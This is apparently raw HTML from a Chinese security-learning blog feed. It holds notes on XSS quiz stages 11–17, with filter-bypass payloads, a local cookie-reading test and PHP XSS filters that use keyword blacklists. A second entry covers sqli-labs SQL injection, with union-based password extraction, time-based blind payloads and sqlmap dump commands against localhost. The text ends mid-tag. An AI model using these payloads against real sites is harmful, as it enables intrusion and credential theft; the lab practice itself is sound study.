src="xss_stage11.png" alt=""></p><p>然而，404,空格换一下在script中间插入<code>&amp;#09;</code>，<code>&amp;#10;</code>，空格等不可见字符，让正则匹配不到。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123"&gt;&lt;a href="javasc&amp;#10;ript:alert(document.domain);"&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure><h2 id="IE特性绕过xss过滤"><a href="#IE特性绕过xss过滤" class="headerlink" title="IE特性绕过xss过滤"></a>IE特性绕过xss过滤</h2><blockquote><p>stage #12</p><p><a href="https://xss-quiz.int21h.jp/stage_no012.php?sid=6bd3fefa2774a7d333026335d5f24239d7ebb75b" target="_blank" rel="noopener">https://xss-quiz.int21h.jp/stage_no012.php?sid=6bd3fefa2774a7d333026335d5f24239d7ebb75b</a></p></blockquote><p>这里过滤了&lt;,”,ie,有一特性  两个  `  号 可闭合 “</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">``</span> onmouseover=alert(<span class="built_in">document</span>.domain)</span><br></pre></td></tr></table></figure><h2 id="css-特性绕过xss过滤"><a href="#css-特性绕过xss过滤" class="headerlink" title="css 特性绕过xss过滤"></a>css 特性绕过xss过滤</h2><blockquote><p>stage #13</p><p><a href="https://xss-quiz.int21h.jp/stage13_0.php?sid=6c076a83715f2f3d68d7fa96051c8cba0d5528b2" target="_blank" rel="noopener">https://xss-quiz.int21h.jp/stage13_0.php?sid=6c076a83715f2f3d68d7fa96051c8cba0d5528b2</a></p></blockquote><p>同样是在ie中，css特性： <code>;background:url(&quot;javascript:alert(document.dmain);&quot;)</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background-color:salmon;background:url(<span class="string">"javascript:alert(document.domain);"</span>)</span><br></pre></td></tr></table></figure><h2 id="css触发xss"><a href="#css触发xss" class="headerlink" title="css触发xss"></a>css触发xss</h2><h3 id="css介绍"><a href="#css介绍" class="headerlink" title="css介绍"></a>css介绍</h3><p>层叠样式表是一种用来表现html或xml等文件样式的计算机语言。css不仅可以静态的修饰网页，还可以配合各种脚本语言动态的对网页各元素进行格式化。</p><h3 id="css中执行js"><a href="#css中执行js" class="headerlink" title="css中执行js"></a>css中执行js</h3><p>css expression(css 表达式)又称Dymamic properties(动态属性)是早期微软DHTML的产物，以其可以在css中定义表达式（公式）来达到建立元素间属性之间的联系等作用，从IE5开始得到支持，后因标准、性能、安全性等问题、微软IE8 bate2标准模式开始，取消对css expression的支持。（实际应用：导航栏，返回顶部）</p><h3 id="注释绕过关键字过滤"><a href="#注释绕过关键字过滤" class="headerlink" title="注释绕过关键字过滤"></a>注释绕过关键字过滤</h3><blockquote><p>stage #14</p><p><a href="https://xss-quiz.int21h.jp/stage-_-14.php?sid=eb2573e964a61b65bc4d456c9fae630ac19266c2" target="_blank" rel="noopener">https://xss-quiz.int21h.jp/stage-_-14.php?sid=eb2573e964a61b65bc4d456c9fae630ac19266c2</a></p></blockquote><p><code>/**/</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xss:expres<span class="comment">/**/sion(if(!window.x)&#123;alert(document.domain);window.x=1;&#125;)</span></span><br></pre></td></tr></table></figure><h2 id="16进制绕过过滤触发xss"><a href="#16进制绕过过滤触发xss" class="headerlink" title="16进制绕过过滤触发xss"></a>16进制绕过过滤触发xss</h2><p>符号 -&gt; 16</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> binascii</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">"\\x"</span>+binascii.b2a_hex(<span class="string">"&lt;"</span>)</span><br></pre></td></tr></table></figure><p>带上\x,js 可识别 </p><blockquote><p>stage #15</p><p><a href="https://xss-quiz.int21h.jp/stage__15.php?sid=e4954d390fd0e5d6a8dd4d1f3647e7f4095bcf2e" target="_blank" rel="noopener">https://xss-quiz.int21h.jp/stage__15.php?sid=e4954d390fd0e5d6a8dd4d1f3647e7f4095bcf2e</a></p></blockquote><p>经检测，&lt; &gt; \ 被过滤，&lt; 16进制为3c  &gt;16进制为3e</p><p><img src="xss_stage15.png" alt=""></p><p><img src="xss_stage15_1.png" alt=""></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\x3cscript\\x3ealert(<span class="built_in">document</span>.domain);\\x3c/script\\x3e</span><br></pre></td></tr></table></figure><h2 id="Ascii绕过过滤触发xss"><a href="#Ascii绕过过滤触发xss" class="headerlink" title="Ascii绕过过滤触发xss"></a>Ascii绕过过滤触发xss</h2><p>符号 -&gt; ascii</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> binascii</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">"\\u00"</span> + binascii.b2a_hex(<span class="string">"&lt;"</span>)</span><br></pre></td></tr></table></figure><blockquote><p>stage #16</p><p><a href="https://xss-quiz.int21h.jp/stage00000016.php?sid=5286887e32a1526dc007701ca9e159eed22b992e" target="_blank" rel="noopener">https://xss-quiz.int21h.jp/stage00000016.php?sid=5286887e32a1526dc007701ca9e159eed22b992e</a></p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\u003cscript\\u003ealert(<span class="built_in">document</span>.domain);\\u003c/script\\u003e</span><br></pre></td></tr></table></figure><h2 id="源"><a href="#源" class="headerlink" title="源"></a>源</h2><p>源：由协议，主机名，端口名组成（例：协议://主机名:端口号/）</p><p>同源策略（SOP）：用于阻止一个非同源的页面恶意代码去访问另外一个非同源页面</p><h3 id="ie的特殊处理"><a href="#ie的特殊处理" class="headerlink" title="ie的特殊处理"></a>ie的特殊处理</h3><p>1.位于可信域的互信的域名间，不受同源策略限制</p><p>2.ie在判断同源时不考虑端口</p><h3 id="document-domain"><a href="#document-domain" class="headerlink" title="document.domain"></a>document.domain</h3><p>可通过document.domain读取或修改源；但有限制，修改之后的源不能通过其他脚本再次修改。</p><p>domain属性可以解决因同源安全策略带来的不同文档的属性共享问题</p><p>降域 document.domain,同源策略认为域和子域属于不同的域，如child.a.com 与 a.ocm,child2.a.com与child1.a.com,两两不同源，可设置document.domain=”a.com”,就同源了；想要设置以上任意两个页面通信 ，两个页面都必须设置document.domain=”a.com”。</p><h2 id="cookie的httponly设置"><a href="#cookie的httponly设置" class="headerlink" title="cookie的httponly设置"></a>cookie的httponly设置</h2><p>消除cookie：Internet选项，常规</p><h3 id="cookie-httponly"><a href="#cookie-httponly" class="headerlink" title="cookie httponly"></a>cookie httponly</h3><p>setcookie(“abc”,”test”,NULL,NULL,NULL,NULL,TRUE);设置secure参数为true之后，就不能使用js获取cookie</p><p>setcookie(<code>name</code>(必须。规定名称),<code>value</code>(必须，规定值),<code>expire</code>(有效期),<code>path</code>(服务器路径),<code>domain</code>( 域名),<code>secure</code>(是否通过安全的https连接来传输cookie),<code>httponly</code>)</p><p>在本地实验：</p><p><code>tescookie.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    setcookie(<span class="string">"user"</span>,<span class="string">"admin"</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">FALSE</span>);</span><br><span class="line">    setcookie(<span class="string">"pass"</span>,<span class="string">"admin"</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">TRUE</span>);</span><br><span class="line">    $id = $_GET[<span class="string">"id"</span>];</span><br><span class="line">    <span class="keyword">echo</span> $id;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;testcookie.php?id&#x3D;%3Cscript%3Edocument.write(document.cookie);%3C&#x2F;script%3E</span><br></pre></td></tr></table></figure><p>就会输出 user=admin，TRUE的pass就不会输出。</p><h2 id="xss-filter-过滤器"><a href="#xss-filter-过滤器" class="headerlink" title="xss-filter 过滤器"></a>xss-filter 过滤器</h2><h3 id="防御函数"><a href="#防御函数" class="headerlink" title="防御函数"></a>防御函数</h3><p><strong><a href="https://www.w3school.com.cn/php/func_string_htmlspecialchars.asp" target="_blank" rel="noopener">htmlspecialchars()函数</a></strong></p><p>把预定义的字符转换为html实体</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htmlspecialchars(string,flags,character-set,double_encode)</span><br></pre></td></tr></table></figure><p><strong><a href="https://www.w3school.com.cn/php/func_string_htmlentities.asp" target="_blank" rel="noopener">htmlentities()函数</a></strong></p><p> 过滤用户输入的数据，将一些特殊字符串转换为html实体。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htmlentities(string,flags,character-set,double_encode)</span><br></pre></td></tr></table></figure><p><strong><a href="https://www.w3school.com.cn/php/func_string_strip_tags.asp" target="_blank" rel="noopener">strip_tags()函数</a></strong></p><p>剥去字符串中得html、xml以及php的标签。</p><blockquote><p>该函数会剥离html注释，这点无法通过allow参数改变。</p><p>该函数是二进制安全的。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strip_tags(string,allow)</span><br></pre></td></tr></table></figure><p><strong>自定义xss filter</strong></p><blockquote><p>法一</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss_clean</span><span class="params">($data)</span></span>&#123;</span><br><span class="line"> <span class="comment">// Fix &amp;entity＼n;</span></span><br><span class="line"> $data=str_replace(<span class="keyword">array</span>(<span class="string">'&amp;'</span>,<span class="string">'&lt;'</span>,<span class="string">'&gt;'</span>),<span class="keyword">array</span>(<span class="string">'&amp;amp;'</span>,<span class="string">'&amp;lt;'</span>,<span class="string">'&amp;gt;'</span>),$data);</span><br><span class="line"> $data=preg_replace(<span class="string">'/(&amp;#*＼w+)[＼x00-＼x20]+;/u'</span>,<span class="string">'$1;'</span>,$data);</span><br><span class="line"> $data=preg_replace(<span class="string">'/(&amp;#x*[0-9A-F]+);*/iu'</span>,<span class="string">'$1;'</span>,$data);</span><br><span class="line"> $data=html_entity_decode($data,ENT_COMPAT,<span class="string">'UTF-8'</span>);</span><br><span class="line"> <span class="comment">// Remove any attribute starting with "on" or xmlns</span></span><br><span class="line"> $data=preg_replace(<span class="string">'#(&lt;[^&gt;]+?[＼x00-＼x20"＼'</span>])(?:on|xmlns)[^&gt;]*+&gt;<span class="comment">#iu','$1&gt;',$data);</span></span><br><span class="line"> <span class="comment">// Remove javascript: and vbscript: protocols</span></span><br><span class="line"> $data=preg_replace(<span class="string">'#([a-z]*)[＼x00-＼x20]*=[＼x00-＼x20]*([`＼'</span><span class="string">"]*)[＼x00-＼x20]*j[＼x00-＼x20]*a[＼x00-＼x20]*v[＼x00-＼x20]*a[＼x00-＼x20]*s[＼x00-＼x20]*c[＼x00-＼x20]*r[＼x00-＼x20]*i[＼x00-＼x20]*p[＼x00-＼x20]*t[＼x00-＼x20]*:#iu','$1=$2nojavascript...',$data);</span></span><br><span class="line"><span class="string"> $data=preg_replace('#([a-z]*)[＼x00-＼x20]*=([＼'"</span>]*)[＼x00-＼x20]*v[＼x00-＼x20]*b[＼x00-＼x20]*s[＼x00-＼x20]*c[＼x00-＼x20]*r[＼x00-＼x20]*i[＼x00-＼x20]*p[＼x00-＼x20]*t[＼x00-＼x20]*:<span class="comment">#iu','$1=$2novbscript...',$data);</span></span><br><span class="line"> $data=preg_replace(<span class="string">'#([a-z]*)[＼x00-＼x20]*=([＼'</span><span class="string">"]*)[＼x00-＼x20]*-moz-binding[＼x00-＼x20]*:#u','$1=$2nomozbinding...',$data);</span></span><br><span class="line"><span class="string"> // Only works in IE: &lt;span style="</span>width: expression(alert(<span class="string">'Ping!'</span>));<span class="string">"&gt;&lt;/span&gt;</span></span><br><span class="line"><span class="string"> $data=preg_replace('#(&lt;[^&gt;]+?)style[＼x00-＼x20]*=[＼x00-＼x20]*[`＼'"</span>]*.*?expression[＼x00-＼x20]*＼([^&gt;]*+&gt;<span class="comment">#i','$1&gt;',$data);</span></span><br><span class="line"> $data=preg_replace(<span class="string">'#(&lt;[^&gt;]+?)style[＼x00-＼x20]*=[＼x00-＼x20]*[`＼'</span><span class="string">"]*.*?behaviour[＼x00-＼x20]*＼([^&gt;]*+&gt;#i','$1&gt;',$data);</span></span><br><span class="line"><span class="string"> $data=preg_replace('#(&lt;[^&gt;]+?)style[＼x00-＼x20]*=[＼x00-＼x20]*[`＼'"</span>]*.*?s[＼x00-＼x20]*c[＼x00-＼x20]*r[＼x00-＼x20]*i[＼x00-＼x20]*p[＼x00-＼x20]*t[＼x00-＼x20]*:*[^&gt;]*+&gt;<span class="comment">#iu','$1&gt;',$data);</span></span><br><span class="line"> <span class="comment">// Remove namespaced elements (we do not need them)</span></span><br><span class="line"> $data=preg_replace(<span class="string">'#&lt;/*＼w+:＼w[^&gt;]*+&gt;#i'</span>,<span class="string">''</span>,$data);</span><br><span class="line"> <span class="keyword">do</span>&#123;<span class="comment">// Remove really unwanted tags</span></span><br><span class="line"> $old_data=$data;</span><br><span class="line"> $data=preg_replace(<span class="string">'#&lt;/*(?:applet|b(?:ase|gsound|link)|embed|frame(?:set)?|i(?:frame|layer)|l(?:ayer|ink)|meta|object|s(?:cript|tyle)|title|xml)[^&gt;]*+&gt;#i'</span>,<span class="string">''</span>,$data);</span><br><span class="line"> &#125;<span class="keyword">while</span>($old_data!==$data);</span><br><span class="line"> <span class="comment">// we are done...</span></span><br><span class="line"> <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>法二</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//php防注入和XSS攻击通用过滤.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//by qq:831937</span></span><br><span class="line"></span><br><span class="line">$_GET    &amp;&amp; SafeFilter($_GET);</span><br><span class="line">$_POST   &amp;&amp; SafeFilter($_POST);</span><br><span class="line">$_COOKIE &amp;&amp; SafeFilter($_COOKIE);</span><br><span class="line">functionSafeFilter (&amp;$arr)</span><br><span class="line">&#123; </span><br><span class="line">   $ra=<span class="keyword">Array</span>(<span class="string">'/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/'</span>,<span class="string">'/script/'</span>,<span class="string">'/javascript/'</span>,<span class="string">'/vbscript/'</span>,<span class="string">'/expression/'</span>,<span class="string">'/applet/'</span>,<span class="string">'/meta/'</span>,<span class="string">'/xml/'</span>,<span class="string">'/blink/'</span>,<span class="string">'/link/'</span>,<span class="string">'/style/'</span>,<span class="string">'/embed/'</span>,<span class="string">'/object/'</span>,<span class="string">'/frame/'</span>,<span class="string">'/layer/'</span>,<span class="string">'/title/'</span>,<span class="string">'/bgsound/'</span>,<span class="string">'/base/'</span>,<span class="string">'/onload/'</span>,<span class="string">'/onunload/'</span>,<span class="string">'/onchange/'</span>,<span class="string">'/onsubmit/'</span>,<span class="string">'/onreset/'</span>,<span class="string">'/onselect/'</span>,<span class="string">'/onblur/'</span>,<span class="string">'/onfocus/'</span>,<span class="string">'/onabort/'</span>,<span class="string">'/onkeydown/'</span>,<span class="string">'/onkeypress/'</span>,<span class="string">'/onkeyup/'</span>,<span class="string">'/onclick/'</span>,<span class="string">'/ondblclick/'</span>,<span class="string">'/onmousedown/'</span>,<span class="string">'/onmousemove/'</span>,<span class="string">'/onmouseout/'</span>,<span class="string">'/onmouseover/'</span>,<span class="string">'/onmouseup/'</span>,<span class="string">'/onunload/'</span>);</span><br><span class="line">   <span class="keyword">if</span>(is_array($arr))</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">foreach</span>($arras</span><br><span class="line">$key  =&gt; $value)</span><br><span class="line">     &#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_array($value))</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span>(!get_magic_quotes_gpc())             <span class="comment">//不对magic_quotes_gpc转义过的字符使用addslashes(),避免双重转义。</span></span><br><span class="line">          &#123;</span><br><span class="line">             $value = addslashes($value);          <span class="comment">//给单引号（'）、双引号（"）、反斜线（\）与 NUL（NULL 字符）加上反斜线转义</span></span><br><span class="line">          &#125;</span><br><span class="line">          $value      = preg_replace($ra,<span class="string">''</span>,$value);    <span class="comment">//删除非打印字符，粗暴式过滤xss可疑字符串</span></span><br><span class="line">          $arr[$key]     = htmlentities(strip_tags($value));<span class="comment">//去除 HTML 和 PHP 标记并转换为 HTML 实体</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          SafeFilter($arr[$key]);</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="编码转义"><a href="#编码转义" class="headerlink" title="编码转义"></a>编码转义</h2><h3 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h3><p>将不安全的字符编码为安全字符在进行传输（通用得安全字母表）</p><p>%+两个表示字符ascii的16进制数</p><h3 id="html编码"><a href="#html编码" class="headerlink" title="html编码"></a>html编码</h3><p>一些保留字符出现在文本节点和标签值里不安全，如“&lt;&gt;”会导致刘安琪误以为标签</p><p>实体编码</p><p>一般&amp;开头，“;”结尾，可不加“；”。如”&lt;”转为”&lt;”</p><p>进制编码</p><p>以&amp;#开头，加上字符的数值，”;”结尾可不加。字符数值可以是任意十进制ASCII码或Unicode字符编码，十六进制的数值需要在编码数字前加”x“ .</p><h3 id="js编码"><a href="#js编码" class="headerlink" title="js编码"></a>js编码</h3><p>\u +00 + ASCII码</p><p>\x + ASCII码</p><p><a href="http://utf-8.jp/public/jsfuck.html" target="_blank" rel="noopener">jsfuck</a></p><h3 id="编码含义"><a href="#编码含义" class="headerlink" title="编码含义"></a>编码含义</h3><p>攻击绕过</p><h2 id="xss过滤器绕过"><a href="#xss过滤器绕过" class="headerlink" title="xss过滤器绕过"></a>xss过滤器绕过</h2><p>xss payload测试</p><p>kali路径：/usr/share/wordlists/wfuzz/Injections/xss.txt</p><p>自动化探测，burp:Intruder模块，在positions设置注入位置；在payload中设置payload type为runtime file然后选择对应的xss payload，之后start attack。</p><p><strong>关注最新的html等内容</strong></p><p>例如更新了新标签，可进行xss测试</p><p>参考 ：owasp.org</p><h2 id="xss发生的位置"><a href="#xss发生的位置" class="headerlink" title="xss发生的位置"></a>xss发生的位置</h2><h3 id="get型url中的xss"><a href="#get型url中的xss" class="headerlink" title="get型url中的xss"></a>get型url中的xss</h3><p>如果url修改提交的参数值,在页面显示，很有可能存在(反射)xss</p><h3 id="post表单中的xss"><a href="#post表单中的xss" class="headerlink" title="post表单中的xss"></a>post表单中的xss</h3><p>在表单中的提交修改的参数值，在页面中显示，很有可能存在xss</p><p>form data</p><h3 id="json中的xss"><a href="#json中的xss" class="headerlink" title="json中的xss"></a>json中的xss</h3><p>json(javascript object notation)是一种轻量级的数据交换格式，易于人阅读和编写，同时也易于机器解析和生成，并有效的提升网络传输效率</p><p>json 最常见的格式是对象的键值对</p><p>闭合前面+;alert(“xss”);//注释后面</p><h3 id="自定义http头中的xss"><a href="#自定义http头中的xss" class="headerlink" title="自定义http头中的xss"></a>自定义http头中的xss</h3><p>如果在http自定义头中提交的参数值，在页面中显示。很有可能存在xss</p><h2 id="存储型xss灰盒测试"><a href="#存储型xss灰盒测试" class="headerlink" title="存储型xss灰盒测试"></a>存储型xss灰盒测试</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>PHPstuday:搭建微程序，rocboss</p><p>定向xss挖掘:探测漏洞位置，能存储的地方</p><p>黑名单审计：查看filter，绕过黑名单</p><p>绕过过滤，触发xss：绕过并针对漏洞攻击</p><h2 id="自动挖掘工具"><a href="#自动挖掘工具" class="headerlink" title="自动挖掘工具"></a>自动挖掘工具</h2><p>xsser介绍：针对web应用程序自动化挖掘，利用，报告xss漏洞的框架</p><p>原理：不断拼接payload</p><p>帮助信息： xsser -h</p><p>启动方式： 图像化 xsser- gtk</p><p><a href="https://github.com/s0md3v/XSStrike" target="_blank" rel="noopener">xsstrike</a></p><blockquote><p>stage #17</p><p><a href="https://xss-quiz.int21h.jp/stage-No17.php?sid=4f0dacf93ef764da56fd687692abc63e1a31e095" target="_blank" rel="noopener">https://xss-quiz.int21h.jp/stage-No17.php?sid=4f0dacf93ef764da56fd687692abc63e1a31e095</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入</title>
      <link href="/categories/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/categories/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>sql注入原理和sqli靶场</p><a id="more"></a><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>定义：</p><p>服务端的sql语句被恶意修改并成功执行的行为。</p><p>原理：</p><p>客户端向服务端发送数据，服务端未严格校验客户端发送数据（sql语言是解释型语言）</p><p>产生具体原因：</p><ul><li>代码对sql语句的参数过滤不严格</li><li>未启用框架的安全配置，如php的gpc</li><li>未使用安全框架的查询方法，如对应开发语言的安全框架的查询接口</li><li>测试接口未删除</li><li>未启用防火墙</li><li>未启用其他安全防护设备</li></ul><p>业务场景：</p><p>所有与数据库产生交互的地方都有可能</p><ul><li>登录功能</li><li>搜索功能</li><li>详情页</li><li>商品购买</li><li>…</li></ul><p>漏洞危害：</p><ul><li>数据库信息泄露</li><li>网页篡改</li><li>网站被挂马，传播恶意软件</li><li>数据库被恶意操作</li><li>服务器被远程控制，被安装后门</li></ul><p>不同人的看法：</p><ul><li>研发人员：这不是bug,不要耽误我的开发进度</li><li>运维人员：研发怎么回事？</li><li>产品经理：研发怎么回事？</li><li>安全人员：这研发一点安全意识都没有</li><li>吃瓜群众：真香（看热闹），？？？说的啥</li></ul><p>步骤：</p><ol><li><p>判断是否有注入（是否严格校验）<br>(1).可控参数改变能否影响页面显示<br>(2).输入了sql语句是否能报错（报错可看到数据库的一些语句痕迹，不报错可判断我们的语句是否成功闭合）</p></li><li><p>什么类型的注入</p></li><li><p>语句能否被恶意篡改</p></li><li><p>是否能成功执行</p></li><li><p>获取数据</p></li></ol><p>mysql数据库库结构：默认mysql和infomation_schema数据库<br>infomatino_schema内的schemata表存有所有库名；tables表中的所有表名；columns表内存有所有字段名。<br>数据库-&gt;表-&gt;字段-&gt;值</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>返回类型：get和post</p><p>数据类型：整型，字符型</p><p>其他类型：…</p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>布尔，时间（sleep,benchmark）</p><p>burpsuite工具链接：<a href="https://pan.baidu.com/s/1pCEyXH5mkD2RojXk7DvXdA" target="_blank" rel="noopener">https://pan.baidu.com/s/1pCEyXH5mkD2RojXk7DvXdA</a><br>提取码：1mbb<br>复制这段内容后打开百度网盘手机App，操作更方便哦</p><p><a href="https://www.cnblogs.com/tynam/p/10089111.html" target="_blank" rel="noopener">破解参考博客</a></p><p><a href="https://www.cnblogs.com/nieliangcai/p/6689915.html" target="_blank" rel="noopener">burpsuite使用参考博客</a></p><h3 id="get基于报错的注入"><a href="#get基于报错的注入" class="headerlink" title="get基于报错的注入"></a>get基于报错的注入</h3><p><strong>Less-1:</strong><br>‘’1’’ LIMIT 0,1’<br>‘1’’ LIMIT 0,1<br>sql: select password,a from admain where id=’’ LIMIT 0,1</p><p><code>手工注入：</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sqli/Less-1/?id=1' order by 3  --+ ✔判断字段数</span><br><span class="line">联合查询：</span><br><span class="line">127.0.0.1/sqli/Less-1/?id=0' UNION SELECT 1,user(),database() --+✔123占位</span><br><span class="line"></span><br><span class="line">127.0.0.1/sqli/Less-1/?id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+ #✔获取表名</span><br><span class="line"></span><br><span class="line">127.0.0.1/sqli/Less-1/?id=0' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+ #✔获取字段名</span><br><span class="line"></span><br><span class="line">127.0.0.1/sqli/Less-1/?id=0' union select 1,group_concat(username,0x3a,password),3 from users--+ #✔获取字段值</span><br></pre></td></tr></table></figure><blockquote><p>解读： 0x3a为 ”:“</p></blockquote><p><code>sqlmap:</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --dbs --batch</span><br><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" -D security --tables --batch</span><br><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" -D security -T users --columns --batch</span><br><span class="line"><span class="meta">#</span><span class="bash">下面(<span class="string">''</span>是错的，要用<span class="string">""</span>或无引号，如下)</span></span><br><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" -D security -T users -C "password,username" --dump --batch</span><br><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" -D security -T users -C password,username --dump --batch</span><br></pre></td></tr></table></figure><p><strong>Less-2:</strong><br>‘’ LIMIT 0,1’<br>‘ LIMIT 0,1<br>sql: select * from admain where id=1 limit 0,1</p><p><strong>Less-3：</strong><br>‘’1&#39;) LIMIT 0,1’<br>‘1&#39;) LIMIT 0,1<br>sql: select * from admain where id = (‘1’) limit 0,1</p><p><strong>Less-4:</strong><br>‘“1&quot;) LIMIT 0,1’<br>“1&quot;) LIMIT 0,1<br>sql: select * from  admain where id=(“1”) limit 0,1</p><h3 id="get盲注："><a href="#get盲注：" class="headerlink" title="get盲注："></a>get盲注：</h3><h4 id="基于时间的盲注："><a href="#基于时间的盲注：" class="headerlink" title="基于时间的盲注："></a>基于时间的盲注：</h4><p><strong>Less-9:</strong></p><p>127.0.0.1/sqli/Less-9/?id=1” and if(ascii(stustr(database(),1,1))=115,1,sleep(3)) –+</p><p><strong>Less-10:</strong></p><p>127.0.0.1/sqli/Less-10/?id=1” and if(ascii(stustr(database(),1,1))=115,1,sleep(3)) –+</p><h4 id="基于boolean的盲注："><a href="#基于boolean的盲注：" class="headerlink" title="基于boolean的盲注："></a>基于boolean的盲注：</h4><p><strong>less-8</strong>:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span 